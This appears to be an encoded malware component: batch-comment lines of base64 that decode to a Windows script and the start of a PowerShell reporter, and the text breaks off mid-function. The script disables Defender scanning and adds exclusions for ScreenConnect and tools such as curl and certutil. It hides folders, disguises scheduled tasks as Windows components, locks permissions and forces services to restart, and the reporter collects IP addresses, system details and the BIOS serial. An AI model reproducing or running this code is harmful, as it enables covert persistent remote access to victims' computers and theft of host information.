::aHMiIC92ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgL3QgUkVHX0RXT1JE
::IC9kIDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIiAvdCBSRUdfRFdPUkQg
::L2QgMCAvZiA+bnVsIDI+JjENCnJlZyBhZGQgIkhLTE1cU09GVFdBUkVcTWljcm9z
::b2Z0XFdpbmRvd3MgRGVmZW5kZXJcRXhjbHVzaW9uc1xQYXRocyIgL3YgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiIC90IFJFR19EV09SRCAv
::ZCAwIC9mID5udWwgMj4mMQ0KcmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93cyBEZWZlbmRlclxFeGNsdXNpb25zXFBhdGhzIiAvdiAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSIgL3QgUkVHX0RXT1JEIC9k
::IDAgL2YgPm51bCAyPiYxDQpyZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29m
::dFxXaW5kb3dzIERlZmVuZGVyXEV4Y2x1c2lvbnNcUGF0aHMiIC92ICIlUEY4NiVc
::U2NyZWVuQ29ubmVjdCBDbGllbnQqIiAvdCBSRUdfRFdPUkQgL2QgMCAvZiA+bnVs
::IDI+JjENCmZvciAlJVAgaW4gKG1zaWV4ZWMuZXhlIGN1cmwuZXhlIGNtZC5leGUg
::cG93ZXJzaGVsbC5leGUgY2VydHV0aWwuZXhlIFNjcmVlbkNvbm5lY3QuQ2xpZW50
::U2VydmljZS5leGUgU2NyZWVuQ29ubmVjdC5XaW5kb3dzQ2xpZW50LmV4ZSkgZG8g
::KA0KICByZWcgYWRkICJIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIERl
::ZmVuZGVyXEV4Y2x1c2lvbnNcUHJvY2Vzc2VzIiAvdiAiJSVQIiAvdCBSRUdfRFdP
::UkQgL2QgMCAvZiA+bnVsIDI+JjENCikNCg0KUkVNIC0tLSBEZWZlbmRlcjogbGl2
::ZSBNcFByZWZlcmVuY2UgKHN0cm9uZ2VyIHRoYW4gcmVnIGFsb25lKSAtLS0NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyIgXg0KICAiVHJ5e1NldC1NcFByZWZl
::cmVuY2UgLURpc2FibGVSZWFsdGltZU1vbml0b3JpbmcgJHRydWU7IFNldC1NcFBy
::ZWZlcmVuY2UgLURpc2FibGVCZWhhdmlvck1vbml0b3JpbmcgJHRydWU7IFNldC1N
::cFByZWZlcmVuY2UgLURpc2FibGVJT0FWUHJvdGVjdGlvbiAkdHJ1ZTsgU2V0LU1w
::UHJlZmVyZW5jZSAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICR0cnVlfUNhdGNoe307
::IiBeDQogICIkcGF0aHM9QCgnJVdEJScsJyVXRDIlJywnQzpcV2luZG93c1xUZW1w
::JywkZW52OlRFTVAsJyVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQqJywnJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50KicpOyIgXg0KICAidHJ5eyRwYXRocys9QChH
::ZXQtQ2hpbGRJdGVtIC1QYXRoICRlbnY6UHJvZ3JhbUZpbGVzIC1GaWx0ZXIgJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50KicgLURpcmVjdG9yeSAtRUEgMCB8IEZvckVhY2gt
::T2JqZWN0IHskXy5GdWxsTmFtZX0pfWNhdGNoe307IiBeDQogICJ0cnl7JHBmODY9
::W0Vudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aCgnUHJvZ3JhbUZpbGVzWDg2Jyk7
::IGlmKCRwZjg2KXskcGF0aHMrPUAoR2V0LUNoaWxkSXRlbSAtUGF0aCAkcGY4NiAt
::RmlsdGVyICdTY3JlZW5Db25uZWN0IENsaWVudConIC1EaXJlY3RvcnkgLUVBIDAg
::fCBGb3JFYWNoLU9iamVjdCB7JF8uRnVsbE5hbWV9KX19Y2F0Y2h7fTsiIF4NCiAg
::ImZvcmVhY2goJHAgaW4gKCRwYXRocyB8IFNlbGVjdC1PYmplY3QgLVVuaXF1ZSkp
::eyBpZigkcCl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggJHAgLUVB
::IDAgfSB9OyIgXg0KICAiZm9yZWFjaCgkeCBpbiBAKCdtc2lleGVjLmV4ZScsJ2N1
::cmwuZXhlJywnY21kLmV4ZScsJ3Bvd2Vyc2hlbGwuZXhlJywnY2VydHV0aWwuZXhl
::JywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScsJ1NjcmVlbkNvbm5l
::Y3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
::c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2Ug
::LUV4Y2x1c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIg
::Pm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0
::cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAtLS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUi
::DQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0tLSBoaWRlIHdvcmtkaXJz
::ICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVXRCUiID5u
::dWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6
::IGRvIE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0g
::Y29weS9tb3ZlIG92ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBh
::bmQgZnJvemUgdGhlIHdob2xlIGZsZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBk
::aXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4NCmZvciAlJUYgaW4gKHBrZy5t
::c2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikgZG8gKA0KICBp
::ZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
::Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJk
::ZXIgdG8gZGVsZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBj
::b250YWluIHNwYWNlcyAoIlNlcnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBG
::T1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50byBnYXJiYWdlIHRva2Vucy4gUG93
::ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkgaW5zdGVhZC4NCnBv
::d2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
::b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZl
::cmVuY2U9J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYo
::VGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0
::LUNvbnRlbnQgLUxpdGVyYWxQYXRoICclV0QlXGlkZW50aXR5LmNmZycgLUZvcmNl
::IHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2ggJ15UQVNLX1tBLURdPSgu
::KykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0YXJ0KCdc
::JykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywn
::UGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJl
::cycpIH07IiBeDQogICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1Q
::YXRoICclVEFTS1JPT1QlJyAkbjsgaWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAk
::Zil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFuY2U6ciB8IE91dC1OdWxsOyAm
::IGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxTWVNURU06Ricg
::J0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
::ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0t
::LSBBQ0w6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIp
::IC0tLQ0KaWNhY2xzICIlU3lzdGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0
::b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06RiIgPm51bCAyPiYxDQoN
::ClJFTSAtLS0gQUNMOiBkbyBOT1QgTG9ja0RpciBTY3JlZW5Db25uZWN0IGluc3Rh
::bGwgZGlycyAtLS0NClJFTSB0YWtlb3duK3N0cmlwIG9uIGxpdmUgU0MgZGlycyBi
::cmVha3MgY2xpZW50IGZpbGUgd3JpdGVzL3VwZGF0ZXMg4oaSIHBhbmVsIE9GRkxJ
::TkUNClJFTSB3aGlsZSBzZXJ2aWNlIHN0aWxsIGxvb2tzIFJ1bm5pbmcuIERlZmVu
::ZGVyIGV4Y2x1c2lvbnMgKyBzZXJ2aWNlIFNEIGFyZSBlbm91Z2guDQpSRU0gTzM3
::OiBvbmUtc2hvdCB1bmxvY2sgaWYgYSBwcmlvciBidWlsZCBMb2NrRGlyJ2QgdGhl
::c2UgcGF0aHMuDQppZiBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxhZyIgKA0KICBm
::aW5kc3RyIC9DOiJzY19ub2xvY2tfZGlycyIgIiVXRCVcc2VjdXJlX3NjLmZsYWci
::ID5udWwgMj4mMQ0KICBpZiBlcnJvcmxldmVsIDEgKA0KICAgIGVjaG8gc2NfdW5s
::b2NrX3ByaW9yX2xvY2tkaXI+PiIlTE9HJSINCiAgICBmb3IgJSVEIGluICgNCiAg
::ICAgICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAg
::ICIlUEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDIlKSINCiAgICAgICIl
::UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICAgICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAg
::ICAgIGlmIGV4aXN0ICIlJX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQi
::IC9SIC9EIFkgPm51bCAyPiYxDQogICAgICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0
::IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2FjbHMgIiUlfkQiIC9ncmFu
::dCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0K
::ICAgIGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICAp
::DQopIGVsc2UgKA0KICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3Nj
::LmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25m
::aWcvc3RvcC9kZWxldGUvc2RzZXQ7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0t
::DQpSRU0gUzEyOiBTWSBtdXN0IGluY2x1ZGUgU0QgKERFTEVURSkgKyBXRCAoV1JJ
::VEVfREFDKSArIFdQIHNvIG9ycGhhbiBoZWFsIC8gRlAgbWlncmF0aW9uIC8NClJF
::TSBzYyBzZHNldCByZS1hcHBseSB3b3JrIHVuZGVyIFNZU1RFTSAodGFza3MgcnVu
::IGFzIFNZU1RFTSkuIFdpdGhvdXQgU0QsIHNjIGRlbGV0ZSBBY2Nlc3MgRGVuaWVk
::Lg0Kc2V0ICJTRD1EOihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQ1NEV1A7OztTWSko
::QTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2Rz
::ZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
::JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNE
::JSIgPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhBJSIgc3RhcnQ9IGF1dG8gPm51
::bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
::Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
::Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAw
::MCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQv
::NjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAi
::JVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGlu
::aGVyaXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVU
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6
::ciA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZ
::XFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSko
::Q0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIg
::IkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
::TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAw
::DQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDJUMTYgLSByb290LWxldmVsIHRhc2sgbmFtZXMgKElERU5UVkVSPTcpOyBUUiBv
::d25lcnNoaXA7IFJNTStEYXR0byBrZWVwOyBkeW5hbWljIGdyeXhhIEZQDQpwYXJh
::bSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
::dGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAgW3N0cmluZ10k
::V29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
::VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAg
::ICBbVmFsaWRhdGVTZXQoJ3JpY2gnLCAnY29tcGFjdCcpXVtzdHJpbmddJE1vZGUg
::PSAncmljaCcsDQogICAgW3N0cmluZ10kQnVpbGQgPSAnTzE1JywNCiAgICBbc3Ry
::aW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0g
::J1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVu
::dGx5Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpT
::ZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRs
::czEyIH0gY2F0Y2gge30NCg0KZnVuY3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGgg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ25vdGlmeS5jZmcnDQogICAgJGNmZyA9IEB7
::fQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHBhdGgpKSB7IHJldHVybiAkY2Zn
::IH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHBhdGggfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAt
::OV9dKylccyo9XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRj
::aGVzWzFdXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkY2ZnDQp9DQoNCmZ1bmN0aW9uIEVzYyhbc3RyaW5nXSRzKSB7
::DQogICAgaWYgKCRudWxsIC1lcSAkcykgeyByZXR1cm4gJycgfQ0KICAgIHJldHVy
::biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsn
::IC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHVibGlj
::SXAgew0KICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6
::Ly9hcGkuaXBpZnkub3JnJywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmln
::Lm1lL2lwJywNCiAgICAgICAgICAgICdodHRwczovL2ljYW5oYXppcC5jb20nDQog
::ICAgICAgICkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRyID0gSW52
::b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0
::U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50IHwgT3V0LVN0cmlu
::ZykuVHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEsM30o
::XC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlw
::IH0NCiAgICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScN
::Cn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsNCiAgICB0cnkgew0KICAgICAg
::ICAkaXBzID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJl
::LU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8u
::UHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNl
::bGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQog
::ICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoJGlwcyAtam9pbiAnLCAnKSB9DQog
::ICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRpcHMgPSBHZXQtQ2lt
::SW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIC1GaWx0
::ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVj
::dCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAt
::bm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAg
::ICBpZiAoJGlwcykgeyByZXR1cm4gKCgkaXBzIHwgU2VsZWN0LU9iamVjdCAtVW5p
::cXVlKSAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAn
::bi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJbmZvIHsNCiAgICAkbyA9IFtvcmRl
::cmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVyc2lvbiA9ICduL2En
::OyBCdWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWluID0g
::J24vYSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAg
::ICAgICAgQ1BVID0gJ24vYSc7IE1hbnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9
::ICduL2EnOyBTZXJpYWwgPSAnbi9hJw0KICAgICAgICBUb3RhbFJBTV9HQiA9ICdu
::L2EnOyBEaXNrRnJlZV9HQiA9ICduL2EnOyBEaXNrU2l6ZV9HQiA9ICduL2EnDQog
::ICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdldC1DaW1JbnN0YW5jZSBX
::aW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5D
::YXB0aW9uDQogICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAg
::ICAkby5CdWlsZCA9ICRvcy5CdWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0g
::JG9zLk9TQXJjaGl0ZWN0dXJlDQogICAgICAgICRvLkluc3RhbGxEYXRlID0gKCRv
::cy5JbnN0YWxsRGF0ZSB8IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQnKQ0K
::ICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFzdEJvb3RVcFRpbWUgfCBHZXQt
::RGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAgICAgJG8uVG90
::YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlT
::aXplIC8gMU1CLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAg
::ICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAg
::ICAgICAgJG8uRG9tYWluID0gaWYgKCRjcy5QYXJ0T2ZEb21haW4pIHsgJGNzLkRv
::bWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3VwIH0NCiAgICAgICAgJG8uTWFudWZh
::Y3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAkby5Nb2RlbCA9ICRj
::cy5Nb2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5D
::UFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1P
::YmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRj
::aCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5z
::dGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBjYXRjaCB7fQ0K
::ICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
::Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRp
::c2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEp
::DQogICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXpl
::IC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0K
::ZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkgew0KICAgICRzID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQn
::IH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
::JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3Ry
::aW5nXSR0bikgew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1RO
::ICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUg
::LW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAgICAgICByZXR1cm4gQHsgUHJlc2Vu
::dCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3Qg
::PSAnJzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAgICAk
::bWFwID0gQHt9DQogICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsg
::IiRfIiB9KSAtam9pbiAiYG4iDQogICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkg
::ew0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiop
::XHMqJCcpIHsNCiAgICAgICAgICAgICRtYXBbJG1hdGNoZXNbMV0uVHJpbSgpXSA9
::ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgICRzdGF0
::dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0
::YXR1cyA9ICRtYXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0
::dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydO
::ZXh0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbmV4dCkgeyAkbmV4dCA9ICcn
::IH0NCiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQ0KICAgIGlmICgt
::bm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAgICRyZXN1bHQgPSAkbWFwWydM
::YXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
::JycgfQ0KICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5v
::dCAkdHIpIHsgJHRyID0gJG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMg
::PSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxc
::Lnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICMgUHJlc2VudCBXaW5kb3dz
::IGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlzIE5PVCBoZWFsdGh5IGZvciB1cw0K
::ICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMgLW1hdGNoICdSZWFk
